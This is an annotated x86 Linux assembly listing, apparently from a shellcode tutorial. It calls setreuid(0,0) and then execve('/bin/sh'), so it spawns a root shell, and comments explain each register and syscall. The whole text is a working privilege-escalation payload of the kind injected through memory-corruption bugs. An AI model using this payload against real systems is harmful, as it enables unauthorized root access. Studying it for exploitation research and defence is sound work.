section .data ; section declaration

filepath db "/bin/sh/XAAAABBBB" ; the string

section .text ; section declaration

global _start ; default entry point for ELF linking

_start:

;setreuid(uid_t ruid, uid_t euid)

mov eax,70 ; put 70 into eax, since setreuid is syscall #70
mov ebx,0 ; put 0 into ebx, to set real uid to root
mov ecx, 0 ; put 0 into ecx, to set effective uid to root
int 0x80 ; call the kernel to make the system call happen

;execve(const char *filename, char *const argv[], char *const_envp[])

mov eax,0 ; put 0 into eax
mov ebx,filepath ; put the address of the string into ebx
mov [ebx+7],al ; put the 0 from eax where the X is in the string
             ; (7 bytes offset from the beginning)
mov[ebx+8],ebx ; put the address of the string from ebx where
             ; AAAA is the string (8 bytes offset)
mov[ebx+12],eax ; put the NULL address (4 bytes of 0) where the 
             ; BBBB string is found (12 bytes offset)
mov eax,11 ; now put 11 into eax, since execve is syscall #11
lea ecx,[ebx+8] ; load the address of where the AAAA was into ecx
lea edx,[ebx+12] ; load the address where the BBBB was into edx
int 0x80 ; call the kernel to make the system call happen

